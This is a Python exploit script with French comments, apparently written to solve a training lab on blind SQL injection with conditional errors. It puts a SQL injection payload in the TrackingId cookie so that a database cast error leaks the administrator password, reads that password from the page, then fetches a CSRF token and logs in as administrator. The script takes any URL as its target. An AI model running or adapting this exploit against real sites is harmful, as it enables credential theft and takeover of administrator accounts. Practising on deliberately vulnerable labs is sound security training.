#Blind SQL injection with conditional errors

#Importation
import requests
import re
import urllib3
import sys
import time
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Fonction pour recuperer les cookies
def recuperer_cookies(url,session):    
    try:
        print("Recuperation des cookies ...") 
        recuperer_cookies_reponse=session.get(url,verify=False)
        if recuperer_cookies_reponse.status_code==200:
            cookies_recuperer=recuperer_cookies_reponse.cookies
            mon_TrackingId=cookies_recuperer.get('TrackingId')
            ma_session=cookies_recuperer.get('session')
            print(f"TrackingId: {mon_TrackingId} | Session: {ma_session}")
            return ma_session                  
        else:
            print("L'URL n'est pas joingnable ")
    except Exception as recup_exception:
        print(f"Exception : {recup_exception}")


#Fonction pour recuper le mot de passe de l'administrateur 
def recuperer_password(url, session):
    magic_session = recuperer_cookies(url, session)
    magic_trackingid = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    magic_cookies = {'TrackingId': magic_trackingid, 'session': magic_session}
    
    try:
        # Envoi de la requête GET
        recup_pswd_reponse = requests.get(url, cookies=magic_cookies, verify=False)
        soup_recup_pswd_reponse = BeautifulSoup(recup_pswd_reponse.text, 'html.parser').find_all('h4')
        
        # Recherche du mot de passe dans les éléments <h4>
        for h4 in soup_recup_pswd_reponse:
            match = re.search(r'"(.*?)"', h4.text)
            if match:
                admin_password = match.group(1)
                print(f"Mot de passe trouvé : {admin_password}")
                return admin_password 
        
        print("Erreur : mot de passe non récupéré")
    except Exception as recup_pswd_exception:
        print(f"Erreur lors de la récupération du mot de passe admin : {recup_pswd_exception}")

    return None
    

#Fonction pour recuperer le cookies csrf
def get_crsf_for_login(url,session):
    csrf_url=url+"/login"    
    try:
        print("Recuperation du CSRF pour la connexion ... ")
        csrf_reponse=session.get(csrf_url,verify=False)
        soup_csrf_reponse=BeautifulSoup(csrf_reponse.text,'html.parser')
        csrf_token=soup_csrf_reponse.find('input', {'name':'csrf'})['value']
        return csrf_token
    except Exception as csrf_exception:
        print(f"Erreur lors de la recuperation du csrf : {csrf_exception}")
    
#Fonction pour resoudre le lab en me connectant    
def solve_lab(url,session):
    login_url=url+"/login"
    admin_passwd=recuperer_password(url,session)
    login_csrf=get_crsf_for_login(url,session)
    admin_data={'csrf':login_csrf,'username':'administrator','password':admin_passwd}
    
    try:
        print(f"Tentative de Connexion avec les informations suivantes > Username : administrator et password : {admin_passwd} ")
        connexion_reponse=session.post(login_url,data=admin_data,verify=False)
        if connexion_reponse.ok:
            print("Congratilation : Lab is Solved ")
        else :
            print("Erreur la connexion n'a pu etre effectuer ")
    except Exception as login_exception:
        print(f"Erreur lors de la recuperation du csrf : {login_exception}")

#Point de depart de mon script 
if __name__=="__main__":
    try:        
        mon_url=sys.argv[1]
        ma_session=requests.session()
        solve_lab(mon_url,ma_session)
    except IndexError:
        print(f"[+] > Utilisation : {sys.argv[0]} site_url ")
        print(f"[+] > Exemple     : {sys.argv[0]} \"www.example.com\" ")
    except Exception as Some_exception:
        print(f"[-] > Erreur  : {Some_exception}")
